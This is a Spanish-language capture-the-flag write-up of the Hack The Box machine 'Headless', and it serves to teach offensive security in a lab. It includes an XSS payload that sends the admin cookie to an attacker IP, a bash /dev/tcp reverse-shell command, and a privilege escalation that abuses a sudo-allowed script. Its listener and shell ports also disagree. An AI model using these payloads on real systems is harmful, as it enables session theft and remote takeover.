---
title: "Headless"
description: "Headless"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/Headless

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.11.8
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509180013.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,5000 10.10.11.8
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509180946.png)

## Gobuster

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509182338.png)

Hay una cookie que es is_admin que permite la entrada a /dashboard

# Fase de ataque

## Cookie Stealing

El formulario de contacto no es vulnerable a xss porque detecta la intrusion.
Si modificamos el User-Agent en BurpSuite podemos realizar un ataque xss reflected para recibir la cookie de admin.
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509191941.png)

````
<img src=x onerror=fetch('http://10.10.14.121:1234/?c='+document.cookie);>
````

Abrimos un servidor HTTP para recibir la petición

````
python3 -m http.server -m 80
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509191743.png)

Modificamos la Cookie en el navegador y entramos en /dashboard

## RCE

Hay un servicio web para ver que todo esta Up que es vulnerable a RCE

### Para ganar acceso al sistema (Reverse Shell)

1. Nos ponemos en escucha por el puerto 443

````
nc -nlvp 443
````

2. Mandamos la Reverse Shell con BurpSuite

````
bash -c "bash -i>%26 /dev/tcp/10.10.14.121/1111 0>%261"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509192657.png)
\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

Ajustar proporciones

````
stty rows 44 columns 184
````

# Privilege Escalation

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240509194306.png)
Podemos observar que tenemos syscheck como root
Si miramos syscheck podemos observar que ejeucta un archivo intidb.sh

1. Creamos un archivo initidb.sh conteniendo "/bin/bash"
1. Ejecuatmos

````
/usr/bin/syscheck
````

\[+\] ==pwned!==
